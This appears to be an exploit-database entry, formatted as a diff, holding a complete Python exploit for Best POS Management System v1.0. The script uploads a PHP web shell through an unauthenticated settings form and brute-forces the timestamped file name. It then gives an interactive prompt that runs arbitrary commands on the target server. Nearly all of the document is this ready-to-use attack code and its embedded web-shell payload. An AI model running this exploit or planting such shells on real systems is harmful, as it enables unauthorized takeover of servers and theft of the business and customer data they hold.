@@ -1,0 +1,155 @@
+id: 38714
+date: 05/23/2023
+title: Best POS Management System v1.0 - Unauthenticated Remote Code Execution Exploit
+author: Mesut Cetin
+cves: 
+
+# Exploit Title: Best POS Management System v1.0 - Unauthenticated Remote Code Execution
+# Google Dork: NA
+# Exploit Author: Mesut Cetin
+# Vendor Homepage: https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/mayuri_k/kruxton.zip
+# Version: 1.0 
+# Tested on: Kali Linux 
+
+import sys
+import requests
+import subprocess
+import time
+
+if len(sys.argv) < 2:
+    print("\033[91mUsage: %s <IP>\033[0m" % sys.argv[0])
+    print("Example: %s 192.168.106.130" % sys.argv[0])
+    sys.exit(1)
+
+ip = sys.argv[1]
+url = f"http://{ip}/kruxton/ajax.php?action=save_settings"
+
+def brute_force_timestamp(timestamp_prev, ip):
+    progress = 0
+    webshell = None
+
+    for i in range(20):
+        for j in range(0, 1000, 20):
+            timestamp = timestamp_prev - (timestamp_prev % 1000) + j + i
+            url = f"http://{ip}/kruxton/assets/uploads/{timestamp}_shell.php"
+
+            response = requests.get(url)
+            if response.status_code == 200:
+                webshell = url
+                break
+
+            progress += 1
+            print(f"Attempt {progress}/400", end="\r")
+            time.sleep(0.1)
+
+            if progress >= 400:
+                break
+
+        if webshell or progress >= 400:
+            break
+
+    if webshell:
+        print("\033[92m[+] Webshell found:", webshell, "\033[0m")
+    else:
+        print("\033[91m[-] Webshell not found\033[0m")
+
+    return webshell
+
+def get_unix_timestamp():
+    timestamp = subprocess.check_output(['date', '+%s']).decode().strip()
+    return int(timestamp)
+
+def extract_output(response_text):
+    start_tag = "<pre>"
+    end_tag = "</pre>"
+    start_index = response_text.find(start_tag)
+    end_index = response_text.find(end_tag)
+
+    if start_index != -1 and end_index != -1 and start_index < end_index:
+        output = response_text[start_index + len(start_tag):end_index]
+        return output.strip()
+
+    return None
+
+def code_execution(webshell):
+    if not webshell:
+        print("\033[91mWebshell URI not provided\033[0m")
+        return
+
+    while True:
+        command = input("Enter command to execute (or 'exit' to quit): ")
+        if command == 'exit':
+            break
+
+        url = webshell + f"?cmd={command}"
+        response = requests.get(url)
+
+        output = extract_output(response.text)
+        if output:
+            print("\033[93m[+] Output:\033[0m")
+            print(output)
+        else:
+            print("\033[91m[-] No output received\033[0m")
+
+data = '''\
+-----------------------------49858899034227071432271107689
+Content-Disposition: form-data; name="name"
+
+test
+-----------------------------49858899034227071432271107689
+Content-Disposition: form-data; name="email"
+
+test@gmail.com
+-----------------------------49858899034227071432271107689
+Content-Disposition: form-data; name="contact"
+
+9000000000
+-----------------------------49858899034227071432271107689
+Content-Disposition: form-data; name="about"
+
+test
+-----------------------------49858899034227071432271107689
+Content-Disposition: form-data; name="img"; filename="shell.php"
+Content-Type: application/x-php
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+
+-----------------------------49858899034227071432271107689--'''
+
+headers = {
+    'Host': f"{ip}",
+    'X-Requested-With': 'XMLHttpRequest',
+    'Content-Type': 'multipart/form-data; boundary=---------------------------49858899034227071432271107689',
+    'Content-Length': str(len(data)),
+    'Connection': 'close'
+}
+
+timestamp_prev = get_unix_timestamp()
+response = requests.post(url, data=data, headers=headers)
+
+if response.status_code == 200 and response.text == '1':
+    print("[+] Timestamp: %s" % timestamp_prev)
+    print("\033[92m[+] Successly uploaded shell! Unauthenticated! \033[0m")
+    webshell = brute_force_timestamp(timestamp_prev, ip)
+    code_execution(webshell)
+    
+else:
+    print("Did not worked")
+
+#  0day.today [2023-06-08]  #
